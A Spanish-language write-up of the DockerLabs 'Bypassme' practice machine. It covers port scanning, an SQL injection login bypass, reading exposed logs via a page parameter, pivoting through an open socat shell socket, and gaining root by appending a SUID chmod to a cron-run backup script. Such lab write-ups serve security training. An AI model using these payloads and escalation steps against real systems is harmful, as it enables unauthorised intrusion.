# 🧠 **Informe de Pentesting – Máquina: Bypassme**

### 💡 **Dificultad:** Fácil

📦 **Plataforma:** DockerLabs
🌐 **Objetivo:** Compromiso completo de la máquina mediante enumeración, explotación web y escalada de privilegios.

![Despliegue](/Bypassme/Imagenes/Maquina.png)

---

## 🚀 **Despliegue de la Máquina**

Se inicia la máquina vulnerable descomprimiendo el archivo proporcionado y ejecutando el script de despliegue:

```bash
unzip bicho.zip
sudo bash auto_deploy.sh bypassme.tar
```

![Despliegue](/Bypassme/Imagenes/Despliegue.png)

---

## 📶 **Comprobación de Conectividad**

Se valida que la máquina objetivo se encuentra activa y responde a solicitudes ICMP:

```bash
ping -c1 172.17.0.2
```

---

## 🔍 **Escaneo de Puertos**

### 🔎 Escaneo Total

Se realiza un escaneo completo de todos los puertos TCP con el objetivo de identificar servicios expuestos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### 📌 Puertos abiertos identificados:

* `22/tcp`: SSH
* `80/tcp`: HTTP

---

### 🧩 Detección de Servicios

Se procede a enumerar versiones y servicios activos:

```bash
nmap -sCV -p22,80 172.17.0.2
```

![Puertos](/Bypassme/Imagenes/conectividad.png)

---

## 🧭 **Reconocimiento Web**

### 🖥️ Acceso inicial

Al acceder a:

```
http://172.17.0.2
```

Se observa una aplicación web funcional de inicio de sesión.

---

![Puertos](/Bypassme/Imagenes/conectividad.png)

---

### 🗂️ **Fuzzing de Directorios**

```bash
gobuster dir -u 'http://172.17.0.2/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 400 --exclude-length 0
```

![logs](/Bypassme/Imagenes/gobusterprimero.png)

Durante este proceso se detectan varios directorios, aunque inicialmente no se identifica un vector de ataque directo.

---

Posteriormente, tras varios intentos de inyección SQL, se detecta que es posible bypass de autenticación utilizando:

```sql
admin' OR '1'='1' -- -
```

usuario: `admin`

![Puertos](/Bypassme/Imagenes/loginsql.png)

---

Después de esto se obtienen indicios de la existencia de logs, según la información mostrada por la aplicación:

![Puertos](/Bypassme/Imagenes/inyeccion.png)

En este caso, se prueban varias combinaciones hasta encontrar acceso mediante:

```
http://172.17.0.2/index.php?page=logs/logs.txt
```

---

![Puertos](/Bypassme/Imagenes/logs.png)

En los logs encontrados se observan múltiples intentos de autenticación. Solo uno tiene éxito y aparece en Base64.

La cadena decodificada es:

```
NGxiM3J0MTIz
```

La contraseña obtenida para acceso SSH es:

```
4lb3rt123
```

---

## 🔐 **Acceso por SSH**

```bash
ssh albert@172.17.0.2
```

![Puertos](/Bypassme/Imagenes/ssh.png)

---

## 🧗 **Escalada de privilegios**

La escalada de privilegios se divide en dos fases: movimiento lateral hacia el usuario `conx` y explotación de un script ejecutado por root.

---

### 🔎 Fase 1: Reconocimiento y movimiento lateral

Una vez dentro como `albert`, se realiza enumeración del sistema:

```bash
whoami
cat /etc/passwd | grep sh$
ps aux
```

Se identifica el usuario `conx`.

En los procesos activos se detecta lo siguiente:

```
socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
```

Esto indica la existencia de un socket UNIX que expone una shell asociada al usuario `conx`.

---

Se realiza conexión al socket:

```bash
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Posteriormente, se estabiliza la shell:

```bash
script -c bash /dev/null
```

---

## ⚙️ Fase 2: Inyección en scripts y escalada a root

Una vez como `conx`, se detecta un script con permisos elevados:

```bash
/var/backups/backup.sh
```

Se verifica que es ejecutado por root mediante tareas cron.

Se modifica el script para insertar un cambio de permisos:

```bash
echo "chmod u+s /bin/bash" >> /var/backups/backup.sh
```

---

Se espera la ejecución del cron y se valida el cambio:

```bash
ls -l /bin/bash
```

Resultado:

```
-rwsr-xr-x 1 root root /bin/bash
```

---

## 🏁 Ejecución final

Se obtiene una shell privilegiada:

```bash
bash -p
whoami
```

Resultado:

```
root
```

---

## 🧾 Resumen técnico de la vulnerabilidad

| Vector de ataque       | Descripción                           |
| ---------------------- | ------------------------------------- |
| SQL Injection          | Bypass de autenticación en login      |
| Information Disclosure | Exposición de logs con credenciales   |
| Misconfiguration       | Socket UNIX expuesto con shell        |
| Weak Permissions       | Script modificable ejecutado por root |
| Privilege Escalation   | Cron ejecutando script manipulable    |

---



